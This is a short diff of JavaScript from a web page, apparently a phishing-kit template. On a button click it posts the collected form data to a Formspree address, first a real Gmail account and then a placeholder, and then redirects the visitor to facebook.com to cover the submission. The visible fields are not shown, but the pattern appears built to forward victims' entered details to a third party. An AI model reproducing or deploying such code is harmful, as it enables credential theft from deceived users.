@@ -68,7 +68,7 @@
 			
 			$('button#send').click(function(){
 				/*
-				$.post( "https://formspree.io/onlinejobatpb@gmail.com", dataobj).done(function() {
+				$.post( "https://formspree.io/yourEmail@example.com", dataobj).done(function() {
 					$(location).attr('href','https://www.facebook.com');
 				}).fail(function() {
 					$(location).attr('href','https://www.facebook.com');
@@ -78,7 +78,7 @@
 				*/
 				$.ajax({
 					type: "POST",
-					url: "https://formspree.io/onlinejobatpb@gmail.com",
+					url: "https://formspree.io/yourEmail@example.com",
 					crossDomain: true,
 					data: JSON.stringify(dataobj),
 					contentType: "application/json; charset=utf-8",
